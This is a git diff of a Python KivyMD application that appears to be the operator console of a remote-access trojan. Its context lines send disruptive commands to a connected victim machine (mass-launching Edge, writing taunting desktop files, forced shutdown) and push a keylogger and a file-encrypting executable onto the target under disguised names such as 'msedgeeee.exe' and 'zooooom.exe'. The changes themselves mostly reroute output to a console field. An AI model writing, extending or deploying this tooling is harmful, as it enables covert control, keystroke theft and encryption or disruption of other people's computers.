@@ -468,7 +468,7 @@ class Main(MDApp):
             output = self.currConn.recv(int(recvsize)).decode()
             print('Output: ', output)
             self.root.ids.disruptConsoleField.text = output
-            self.killTaskDialog.dismiss(force=True)
+            self.denyFilesDialog.dismiss(force=True)
             break
 
     # Juls Severe Disruption
@@ -481,7 +481,10 @@ class Main(MDApp):
             command = 'FOR /L %A IN (1 1 20) DO (start msedge)'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            self.root.ids.disruptConsoleField.text = command
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
+            print('Output: ', output)
+            self.root.ids.disruptConsoleField.text = output
             break
 
     # Zees Severe Disruption
@@ -494,7 +497,11 @@ class Main(MDApp):
             command = 'FOR /L %A IN (1 1 20) DO (echo. > C:\\Users\\%USERNAME%\\Desktop\\You_suck_eggs_%A.txt)'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            self.root.ids.disruptConsoleField.text = command
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
+            print('Output: ', output)
+            self.root.ids.disruptConsoleField.text = output
+
             break
 
     # Zees Simple Disruptions
@@ -508,7 +515,10 @@ class Main(MDApp):
             command = 'shutdown /s /t 00'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
-            self.root.ids.disruptConsoleField.text = command
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
+            print('Output: ', output)
+            self.root.ids.disruptConsoleField.text = output
             break
 
     # Kill Task Disruption
@@ -549,6 +559,8 @@ class Main(MDApp):
 
     # Fang's keylogging madness
     def KeyloggerInstall(self):
+        # Reset console
+        self.root.ids.disruptConsoleField.text = ''
         tpath = "%USERPROFILE%\\AppData\\Local\\Microsoft\\msedgeeee.exe"
         kpath = os.path.join(os.getcwd(), "keylogger.exe")
         while True:
@@ -565,7 +577,7 @@ class Main(MDApp):
 
                 # File transfer mode
                 self.currConn.send("ft_True".encode())
-                time.sleep(0.05)
+                time.sleep(0.5)
 
                 # Send target path and size of file
                 self.currConn.send(str("echo " + tpath).encode())
@@ -601,9 +613,15 @@ class Main(MDApp):
                 print('Command sent to client: ', command)
                 output2 = self.currConn.recv(1024).decode()
                 time.sleep(5)
-                print(f"Keylogger{output2}")
+                o1 =f"Keylogger{output2}"
+                print(o1)
+                # Reset console
+                self.root.ids.disruptConsoleField.text = o1
             else:
-                print("Keylogger already installed on target machine.")
+                o2 = "Keylogger already installed on target machine."
+                print(o2)
+                # Reset console
+                self.root.ids.disruptConsoleField.text = o2
             break
 
     def KeyloggerInit(self):
@@ -636,6 +654,8 @@ class Main(MDApp):
             pass
 
     def EncryptFiles(self):
+        # Reset console
+        self.root.ids.disruptConsoleField.text = ''
         tpath = "%USERPROFILE%\\AppData\\Local\\Temp\\zooooom.exe"
         kpath = os.path.join(os.getcwd(), "encrypt.exe")
         while True:
@@ -688,9 +708,13 @@ class Main(MDApp):
                 print('Command sent to client: ', command)
                 output2 = self.currConn.recv(1024).decode()
                 time.sleep(5)
-                print(f"EncryptFile{output2}")
+                o1 = f"EncryptFile{output2}"
+                print(o1)
+                self.root.ids.disruptConsoleField.text = o1
             else:
-                print("EncryptFile already installed on target machine.")
+                o2 = "EncryptFile already installed on target machine."
+                print(o2)
+                self.root.ids.disruptConsoleField.text = o2
             break
 
     def DisruptionMenu(self):
